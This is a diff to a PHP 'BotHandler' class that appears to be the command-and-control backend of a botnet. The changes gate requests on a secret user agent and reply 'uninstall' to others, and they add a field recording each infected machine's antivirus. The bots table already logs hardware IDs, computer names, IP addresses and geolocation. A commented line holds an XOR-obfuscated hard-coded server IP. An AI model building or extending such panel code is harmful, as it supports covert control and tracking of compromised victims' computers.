@@ -23,10 +23,14 @@ class BotHandler{
 
 
     public function request(){
-        if(empty($_POST)){
+        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
+        $statementConfig->execute(array("1"));
+        $config = $statementConfig->fetch();
+
+        if($_SERVER['HTTP_USER_AGENT'] != $config["useragent"] OR empty($_POST)){
             //echo $this->xor_this("http://35.204.135.202/request");
             // echo $this->xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
-            die("404");
+            die("uninstall");
         }
 
         $gi = geoip_open(__DIR__."/../../Geo/GeoIP.dat", "");
@@ -132,8 +136,9 @@ class BotHandler{
             }
 
         }else{
-            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
             $statement->execute(array(
+                $_POST["av"],
                 $_POST["hwid"],
                 $this->xor_this($_POST["username"]),
                 $country,
